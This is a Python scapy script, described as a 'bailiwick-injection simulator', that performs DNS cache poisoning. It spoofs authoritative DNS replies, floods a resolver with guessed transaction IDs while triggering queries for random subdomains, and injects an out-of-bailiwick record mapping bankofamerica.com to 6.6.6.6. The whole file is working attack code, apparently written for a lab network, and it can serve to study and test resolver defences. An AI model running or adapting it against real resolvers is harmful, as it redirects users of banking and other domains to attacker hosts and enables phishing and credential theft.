import argparse
import threading
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

from attack_utils import (
    discover_query_context,
    fqdn,
    normalize_domain,
    random_subdomain,
    resolve_authoritative_server_ip,
    trigger_resolver_query,
)


def craft_bailiwick_injection_response(
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    answer_ip: str,
    injected_name: str,
    injected_ip: str,
    txid: int,
    ttl: int = 300,
):
    query_fqdn = fqdn(query_name)
    injected_fqdn = fqdn(injected_name)

    answer = DNSRR(rrname=query_fqdn, type="A", ttl=ttl, rdata=answer_ip)
    injected = DNSRR(rrname=injected_fqdn, type="A", ttl=ttl, rdata=injected_ip)

    dns = DNS(
        id=txid,
        qr=1,
        aa=1,
        rd=0,
        ra=0,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=1,
        qd=DNSQR(qname=query_fqdn, qtype="A"),
        an=answer,
        ar=injected,
    )
    return IP(src=auth_server_ip, dst=resolver_ip) / UDP(sport=53, dport=resolver_port) / dns


def send_bailiwick_flood(
    *,
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    answer_ip: str,
    injected_name: str,
    injected_ip: str,
    txid_start: int,
    txid_count: int,
    ttl: int,
    inter_packet_delay: float,
) -> int:
    packets = [
        craft_bailiwick_injection_response(
            resolver_ip=resolver_ip,
            resolver_port=resolver_port,
            auth_server_ip=auth_server_ip,
            query_name=query_name,
            answer_ip=answer_ip,
            injected_name=injected_name,
            injected_ip=injected_ip,
            txid=txid,
            ttl=ttl,
        )
        for txid in range(txid_start, txid_start + txid_count)
    ]
    send(packets, verbose=False, inter=inter_packet_delay)
    return len(packets)


def run_injection(args: argparse.Namespace) -> None:
    if args.discover:
        attack_query_name = normalize_domain(args.query_name)
        context = discover_query_context(
            attack_query_name,
            resolver_ip=args.resolver_ip,
            iface=args.iface,
            timeout=args.discovery_timeout,
        )

        auth_server_ip = args.auth_server_ip or context["auth_server_ip"]
        resolver_port = args.resolver_port or context["resolver_port"]
        txid = args.txid if args.txid is not None else context["txid"]
        packet = craft_bailiwick_injection_response(
            resolver_ip=args.resolver_ip,
            resolver_port=resolver_port,
            auth_server_ip=auth_server_ip,
            query_name=attack_query_name,
            answer_ip=args.answer_ip,
            injected_name=args.injected_name,
            injected_ip=args.injected_ip,
            txid=txid,
            ttl=args.ttl,
        )

        for _ in range(args.repeat):
            send(packet, verbose=False)

        print(
            "sent bailiwick injection via discovered context:",
            f"query_name={attack_query_name}",
            f"resolver_port={resolver_port}",
            f"auth_server_ip={auth_server_ip}",
            f"txid={txid}",
            f"injected_name={args.injected_name}",
            flush=True,
        )
        return

    auth_server_ip = args.auth_server_ip
    if auth_server_ip is None:
        context = resolve_authoritative_server_ip(
            args.query_name,
            bootstrap_resolver=args.bootstrap_resolver,
        )
        auth_server_ip = context["auth_server_ip"]
        print(
            "resolved authoritative server:",
            f"zone={context['zone']}",
            f"ns_name={context['ns_name']}",
            f"auth_server_ip={auth_server_ip}",
            flush=True,
        )

    resolver_port = args.resolver_port if args.resolver_port is not None else args.default_resolver_port

    for attempt in range(args.attempts):
        if args.randomize_query_name:
            attack_query_name = random_subdomain(args.query_name)
        else:
            attack_query_name = normalize_domain(args.query_name)

        worker = threading.Thread(
            target=trigger_resolver_query,
            args=(attack_query_name, args.resolver_ip, args.query_timeout),
            daemon=True,
        )
        worker.start()
        time.sleep(args.pre_flood_delay)

        packet_count = send_bailiwick_flood(
            resolver_ip=args.resolver_ip,
            resolver_port=resolver_port,
            auth_server_ip=auth_server_ip,
            query_name=attack_query_name,
            answer_ip=args.answer_ip,
            injected_name=args.injected_name,
            injected_ip=args.injected_ip,
            txid_start=args.txid_start if args.txid is None else args.txid,
            txid_count=args.txid_count if args.txid is None else 1,
            ttl=args.ttl,
            inter_packet_delay=args.inter_packet_delay,
        )
        worker.join(timeout=args.query_timeout + 0.2)

        print(
            f"[attempt {attempt + 1}/{args.attempts}] qname={attack_query_name} "
            f"flooded_packets={packet_count} resolver_port={resolver_port} "
            f"auth_server_ip={auth_server_ip} injected_name={args.injected_name}",
            flush=True,
        )
        if args.inter_attempt_delay:
            time.sleep(args.inter_attempt_delay)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Bailiwick-injection simulator")
    parser.add_argument("--resolver-ip", default="172.28.0.10")
    parser.add_argument("--resolver-port", type=int, default=None)
    parser.add_argument("--default-resolver-port", type=int, default=5300)
    parser.add_argument("--auth-server-ip", default=None)
    parser.add_argument("--bootstrap-resolver", default=None)
    parser.add_argument("--query-name", default="example.com")
    parser.add_argument("--answer-ip", default="93.184.216.34")
    parser.add_argument("--injected-name", default="bankofamerica.com")
    parser.add_argument("--injected-ip", default="6.6.6.6")
    parser.add_argument("--txid", type=int, default=None)
    parser.add_argument("--txid-start", type=int, default=0)
    parser.add_argument("--txid-count", type=int, default=1000)
    parser.add_argument("--attempts", type=int, default=10)
    parser.add_argument("--ttl", type=int, default=300)
    parser.add_argument("--repeat", type=int, default=5)
    parser.add_argument("--randomize-query-name", action=argparse.BooleanOptionalAction, default=True)
    parser.add_argument("--query-timeout", type=float, default=1.0)
    parser.add_argument("--pre-flood-delay", type=float, default=0.02)
    parser.add_argument("--inter-packet-delay", type=float, default=0.0)
    parser.add_argument("--inter-attempt-delay", type=float, default=0.1)
    parser.add_argument("--iface", default=None)
    parser.add_argument("--discovery-timeout", type=float, default=3.0)
    parser.add_argument("--discover", action="store_true")
    return parser


if __name__ == "__main__":
    run_injection(build_parser().parse_args())
